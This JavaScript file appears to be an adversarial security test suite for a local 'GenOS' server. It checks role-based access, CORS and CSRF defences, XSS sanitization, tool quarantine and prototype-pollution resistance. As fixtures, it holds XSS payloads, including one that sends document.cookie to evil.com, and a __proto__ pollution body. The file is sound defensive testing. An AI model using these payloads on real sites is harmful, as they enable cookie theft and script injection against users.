/**
 * GenOS Deep Adversarial Security & Injection Test Suite
 * Exhaustive penetration testing: RBAC escapes, CORS/CSRF spoofing,
 * XSS payload fuzzing, Circuit Breaker quarantine, and prototype pollution.
 */

const http = require('http');
const path = require('path');
const fs = require('fs');
const { TEST_ADMIN_TOKEN, TEST_OPERATOR_TOKEN, TEST_VIEWER_TOKEN } = require('./testAuth');
const { createApp } = require('./src/app');
const { getDatabase, closeDatabase } = require('./src/db');
const { sanitizeString, sanitizeObject } = require('./src/middleware/security');
const circuitBreaker = require('./src/services/circuitBreaker');
const MILITARY_OVERRIDE_TOKEN = TEST_ADMIN_TOKEN;

const TEST_PORT = 4399;
let server = null;
let db = null;

let totalAsserts = 0;
let passedAsserts = 0;

function assert(condition, message) {
  totalAsserts++;
  if (!condition) {
    console.error(`  ❌ FAILED: ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  passedAsserts++;
  console.log(`  ✅ PASS: ${message}`);
}

function sendReq(options, body = null) {
  return new Promise((resolve, reject) => {
    const reqOpts = {
      hostname: 'localhost',
      port: TEST_PORT,
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'valid-session-csrf-token',
        ...(options.headers || {})
      }
    };
    const req = http.request(reqOpts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(data); } catch (e) { json = data; }
        resolve({ status: res.statusCode, headers: res.headers, body: json });
      });
    });
    req.on('error', reject);
    if (body !== null) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

// ---------------------------------------------------------
// 1. RBAC & Military Override Matrix Tests
// ---------------------------------------------------------
async function runRbacMatrixTests() {
  console.log('\n--- 1. RBAC & MILITARY OVERRIDE MATRIX TESTS ---');

  // 1.1 Unauthenticated call to Kill Switch -> 401
  const unauthKill = await sendReq({ method: 'POST', path: '/api/security/kill-switch' }, { reason: 'Rogue test' });
  assert(unauthKill.status === 401 && unauthKill.body.error.code === 'UNAUTHORIZED', 'Unauthenticated POST /api/security/kill-switch rejected with 401 UNAUTHORIZED');

  // 1.2 Unauthenticated call to Halt -> 401
  const unauthHalt = await sendReq({ method: 'POST', path: '/api/halt' }, {});
  assert(unauthHalt.status === 401, 'Unauthenticated POST /api/halt rejected with 401');

  // 1.3 Forged Token attempt on Kill Switch -> 401
  const forgedKill = await sendReq({
    method: 'POST',
    path: '/api/security/kill-switch',
    headers: { Authorization: 'Bearer FORGED-FAKE-TOKEN-999' }
  }, { reason: 'Forged test' });
  assert(forgedKill.status === 401, 'Forged token rejected with 401 on /api/security/kill-switch');

  // 1.4 Viewer token attempt on Circuit Breaker Override -> 403
  const viewerCb = await sendReq({
    method: 'POST',
    path: '/api/mcp/circuit-breaker',
    headers: { Authorization: `Bearer ${TEST_VIEWER_TOKEN}` }
  }, { toolName: 'genos_run', locked: true });
  assert(viewerCb.status === 403 && viewerCb.body.error.code === 'FORBIDDEN', 'Viewer token rejected with 403 FORBIDDEN on /api/mcp/circuit-breaker');

  // 1.5 Operator token attempt on Reset Kill Switch (Admin only) -> 403
  const opReset = await sendReq({
    method: 'POST',
    path: '/api/security/kill-switch/reset',
    headers: { Authorization: `Bearer ${TEST_OPERATOR_TOKEN}` }
  }, {});
  assert(opReset.status === 403 && opReset.body.error.code === 'FORBIDDEN', 'Operator token rejected with 403 on /api/security/kill-switch/reset');

  // 1.6 Operator attempt on Auth Keys management -> 403
  const opKeys = await sendReq({
    method: 'GET',
    path: '/api/auth/keys',
    headers: { Authorization: `Bearer ${TEST_OPERATOR_TOKEN}` }
  });
  assert(opKeys.status === 403, 'Operator rejected with 403 on GET /api/auth/keys');

  // 1.7 Level 5 Military Override Token on Kill Switch -> 200
  const militaryKill = await sendReq({
    method: 'POST',
    path: '/api/security/kill-switch',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { reason: 'Adversarial Drill Verification' });
  assert(militaryKill.status === 200 && militaryKill.body.success === true, 'Level 5 Military Override Token authorized on /api/security/kill-switch');

  // 1.8 Level 5 Military Override Token on Reset -> 200
  const militaryReset = await sendReq({
    method: 'POST',
    path: '/api/security/kill-switch/reset',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, {});
  assert(militaryReset.status === 200 && militaryReset.body.success === true, 'Level 5 Military Override Token successfully resets kill switch');

  // 1.9 Admin token on Auth Keys creation -> 201
  const adminKeyCreate = await sendReq({
    method: 'POST',
    path: '/api/auth/keys',
    headers: { Authorization: `Bearer ${TEST_ADMIN_TOKEN}` }
  }, { label: 'Dynamic Test Key', role: 'operator', permissions: ['read'] });
  assert(adminKeyCreate.status === 201 && adminKeyCreate.body.key && adminKeyCreate.body.key.id, 'Admin token successfully creates new access key with 201 Created');
}

// ---------------------------------------------------------
// 2. CORS Spoofing & CSRF Evasion Probes
// ---------------------------------------------------------
async function runCorsCsrfTests() {
  console.log('\n--- 2. CORS SPOOFING & CSRF PROTECTION PROBES ---');

  // 2.1 Untrusted Origin -> 403 FORBIDDEN_ORIGIN
  const evilOriginRes = await sendReq({
    method: 'GET',
    path: '/api/status',
    headers: { Origin: 'http://malicious-evil-site.ru' }
  });
  assert(evilOriginRes.status === 403 && evilOriginRes.body.error.code === 'FORBIDDEN_ORIGIN', 'Untrusted foreign origin blocked with 403 FORBIDDEN_ORIGIN');

  // 2.2 Subdomain Spoofing -> 403
  const spoofSubdomainRes = await sendReq({
    method: 'GET',
    path: '/api/status',
    headers: { Origin: 'http://localhost.attacker.com' }
  });
  assert(spoofSubdomainRes.status === 403, 'Subdomain spoofing origin rejected with 403');

  // 2.3 Trusted Origin (localhost:5173) -> 200
  const validOriginRes = await sendReq({
    method: 'GET',
    path: '/api/status',
    headers: { Origin: 'http://localhost:5173' }
  });
  assert(validOriginRes.status === 200, 'Legitimate Studio origin (localhost:5173) accepted with 200 OK');

  // 2.4 CSRF Stripping on Mutating Route without Auth -> 403
  const csrfStripped = await sendReq({
    method: 'POST',
    path: '/api/workspaces',
    headers: { Origin: 'http://localhost:3000', 'X-CSRF-Token': '' }
  }, { name: 'CsrfAttack' });
  assert(csrfStripped.status === 403 && csrfStripped.body.error.code === 'CSRF_VALIDATION_FAILED', 'Mutating request without CSRF token or Auth rejected with 403 CSRF_VALIDATION_FAILED');

  // 2.5 Security Headers Verification (CSP, X-Frame-Options, nosniff, etc.)
  const secHeadRes = await sendReq({ method: 'GET', path: '/api/status' });
  assert(secHeadRes.headers['x-frame-options'] === 'DENY', 'X-Frame-Options: DENY header present');
  assert(secHeadRes.headers['x-content-type-options'] === 'nosniff', 'X-Content-Type-Options: nosniff header present');
  assert(secHeadRes.headers['content-security-policy'].includes("default-src 'self'"), 'Strict Content-Security-Policy header enforced');
}

// ---------------------------------------------------------
// 3. Recursive XSS & Injection Fuzzing
// ---------------------------------------------------------
async function runXssInjectionTests() {
  console.log('\n--- 3. RECURSIVE XSS & INJECTION FUZZING ---');

  const xssAttacks = [
    { label: 'Script tag with payload', input: '<script>fetch("http://evil.com/"+document.cookie)</script>' },
    { label: 'Nested script tags', input: '<scr<script>ipt>alert(1)</script>' },
    { label: 'SVG Onload injection', input: '<svg onload="alert(document.domain)">' },
    { label: 'IMG onerror attribute', input: '<img src="invalid.jpg" onerror="alert(\'XSS\')">' },
    { label: 'Iframe javascript URI', input: '<iframe src="javascript:alert(1)"></iframe>' },
    { label: 'Javascript pseudo-protocol in link', input: '<a href="javascript:void(0)">Click</a>' },
    { label: 'Unquoted inline event handler', input: '<div onmouseover=alert(1)>Hover</div>' }
  ];

  for (const atk of xssAttacks) {
    const clean = sanitizeString(atk.input);
    const hasScript = /<script/i.test(clean) || /javascript:/i.test(clean) || /onerror=/i.test(clean) || /onload=/i.test(clean) || /<iframe/i.test(clean);
    assert(!hasScript, `XSS filter neutralizes: ${atk.label}`);
  }

  // 3.2 Deep object/array recursive sanitization in Swarm Proposal API
  const xssProposal = await sendReq({
    method: 'POST',
    path: '/api/swarm/proposals',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, {
    title: 'Adversarial <script>alert(1)</script>Proposal',
    description: 'Nested <iframe src="evil.com"></iframe> content with <img src=x onerror=alert(2)>',
    proposerName: 'Agent<script>alert(3)</script>Alpha',
    tags: ['<script>xss</script>', 'clean-tag']
  });
  assert(xssProposal.status === 201, 'POST /api/swarm/proposals accepted after payload sanitization');

  // Verify in SQLite database that sanitized data was stored
  const stored = await db.get('SELECT * FROM swarm_proposals WHERE id = ?', xssProposal.body.proposalId);
  assert(!stored.title.includes('<script>') && !stored.title.includes('</script>'), 'DB title is sanitized (0 script tags)');
  assert(!stored.description.includes('<iframe>') && !stored.description.includes('onerror='), 'DB description is sanitized (0 iframe/onerror)');
  assert(!stored.proposer_name.includes('<script>'), 'DB proposer_name is sanitized');
}

// ---------------------------------------------------------
// 4. MCP Circuit Breaker & Destructive Quarantine Lockout
// ---------------------------------------------------------
async function runCircuitBreakerTests() {
  console.log('\n--- 4. MCP CIRCUIT BREAKER & DESTRUCTIVE TOOL LOCKOUT ---');

  // 4.1 Viewer trying to execute safe tool -> 403 / 401
  const viewerExec = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${TEST_VIEWER_TOKEN}` }
  }, { toolName: 'genos_inspect', args: {} });
  assert(viewerExec.status === 403, 'Viewer blocked from MCP tool execution with 403 FORBIDDEN');

  // 4.2 Operator trying to execute destructive tool genos_merge -> 503 INSUFFICIENT_ROLE
  const opDestructive = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${TEST_OPERATOR_TOKEN}` }
  }, { toolName: 'genos_merge', args: {} });
  assert(opDestructive.status === 503 && opDestructive.body.error.code === 'INSUFFICIENT_ROLE', 'Operator blocked from destructive genos_merge with 503 INSUFFICIENT_ROLE');

  // 4.3 Manual Tool Quarantine Lock via Admin
  const lockTool = await sendReq({
    method: 'POST',
    path: '/api/mcp/circuit-breaker',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_inspect', locked: true, reason: 'Quarantined for forensic audit' });
  assert(lockTool.status === 200 && lockTool.body.isLocked === true, 'Admin locked tool genos_inspect in quarantine');

  // 4.4 Admin trying to execute quarantined tool -> 503 TOOL_LOCKED
  const lockedExec = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_inspect', args: {} });
  assert(lockedExec.status === 503 && lockedExec.body.error.code === 'TOOL_LOCKED', 'Quarantined tool blocked from execution with 503 TOOL_LOCKED');

  // Unlock tool
  await sendReq({
    method: 'POST',
    path: '/api/mcp/circuit-breaker',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_inspect', locked: false });

  // 4.5 Trigger 3 consecutive tool failures -> trip breaker to OPEN
  circuitBreaker.resetHalt('test_runner');
  circuitBreaker.state = 'CLOSED';
  circuitBreaker.failureCount = 0;
  circuitBreaker.recordFailure('genos_run', 'Fault 1');
  circuitBreaker.recordFailure('genos_run', 'Fault 2');
  circuitBreaker.recordFailure('genos_run', 'Fault 3');
  assert(circuitBreaker.getStatus().state === 'OPEN', 'Circuit breaker tripped to OPEN after 3 consecutive failures');

  // 4.6 Destructive tool blocked while OPEN
  const adminDestructiveOpen = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_run', args: {} });
  assert(adminDestructiveOpen.status === 503 && adminDestructiveOpen.body.error.code === 'CIRCUIT_OPEN', 'Destructive tool blocked during OPEN circuit with 503 CIRCUIT_OPEN');

  // 4.7 Global Halt Lockout on ALL tools
  circuitBreaker.triggerHalt('Hostile intrusion alert', 'military_sentry');
  const haltedExec = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_inspect', args: {} });
  assert(haltedExec.status === 503 && haltedExec.body.error.code === 'SYSTEM_HALTED', 'All tool executions blocked with 503 SYSTEM_HALTED during global halt');

  // Disarm kill switch
  circuitBreaker.resetHalt('test_runner');
  assert(circuitBreaker.getStatus().isHalted === false, 'Circuit breaker and global halt disarmed successfully');
}

// ---------------------------------------------------------
// 5. Fuzzing, Prototype Pollution & Payload Resilience
// ---------------------------------------------------------
async function runFuzzingStressTests() {
  console.log('\n--- 5. FUZZING, PROTOTYPE POLLUTION & PAYLOAD RESILIENCE ---');

  // 5.1 Prototype pollution payload in JSON body
  const protoPayload = JSON.parse('{"__proto__": {"polluted": "yes"}, "name": "SafeName"}');
  const protoRes = await sendReq({
    method: 'POST',
    path: '/api/workspaces',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, protoPayload);
  assert(protoRes.status === 201 || protoRes.status === 200, 'Server processed workspace request with __proto__ key');
  assert(Object.prototype.polluted === undefined, 'Prototype pollution defense verified: Object.prototype NOT polluted');

  // 5.2 Malformed JSON body handling
  const badJsonRes = await sendReq({
    method: 'POST',
    path: '/api/workspaces',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, '{"invalid_json: 123');
  assert(badJsonRes.status === 400 || badJsonRes.status === 500, 'Malformed JSON payload handled gracefully with error status');

  // 5.3 Deeply nested object payload fuzzing
  let deepObj = { level: 0 };
  let curr = deepObj;
  for (let i = 1; i <= 20; i++) {
    curr.child = { level: i };
    curr = curr.child;
  }
  const sanitizedDeep = sanitizeObject(deepObj);
  assert(sanitizedDeep.child.child.level === 2, 'Deeply nested object (20 levels) traversed and sanitized safely');

  // 5.4 Null bytes and Unicode control character handling
  const nullByteStr = 'test\u0000agent\u0007payload';
  const cleanNull = sanitizeString(nullByteStr);
  assert(typeof cleanNull === 'string', 'String with null bytes and control chars handled without server crash');

  // 5.5 High load burst verification (50 rapid requests)
  const burstPromises = [];
  for (let i = 0; i < 50; i++) {
    burstPromises.push(sendReq({
      method: 'GET',
      path: '/api/status',
      headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
    }));
  }
  const burstResults = await Promise.all(burstPromises);
  const okCount = burstResults.filter(r => r.status === 200).length;
  assert(okCount === 50, 'High-concurrency burst (50 requests) handled with 100% success rate (200 OK)');
}

// ---------------------------------------------------------
// Main Test Runner
// ---------------------------------------------------------
async function runAllAdversarialSuites() {
  console.log('================================================================');
  console.log('  GENOS STUDIO ADVERSARIAL PENETRATION & INJECTION TEST SUITE   ');
  console.log('================================================================');

  const testDbPath = path.resolve(__dirname, 'adversarial_test_suite.db');
  if (fs.existsSync(testDbPath)) try { fs.unlinkSync(testDbPath); } catch (e) {}

  db = await getDatabase(testDbPath);
  const app = createApp();
  server = http.createServer(app);
  await new Promise(resolve => server.listen(TEST_PORT, resolve));

  const startTime = Date.now();

  try {
    await runRbacMatrixTests();
    await runCorsCsrfTests();
    await runXssInjectionTests();
    await runCircuitBreakerTests();
    await runFuzzingStressTests();

    const duration = Date.now() - startTime;
    console.log('\n================================================================');
    console.log(`  ALL ADVERSARIAL TESTS PASSED: ${passedAsserts}/${totalAsserts} assertions in ${duration}ms`);
    console.log('================================================================\n');
  } finally {
    server.close();
    await closeDatabase();
    if (fs.existsSync(testDbPath)) try { fs.unlinkSync(testDbPath); } catch (e) {}
  }
}

runAllAdversarialSuites().catch(err => {
  console.error('\n❌ CRITICAL ADVERSARIAL SUITE FAILURE:\n', err);
  process.exit(1);
});
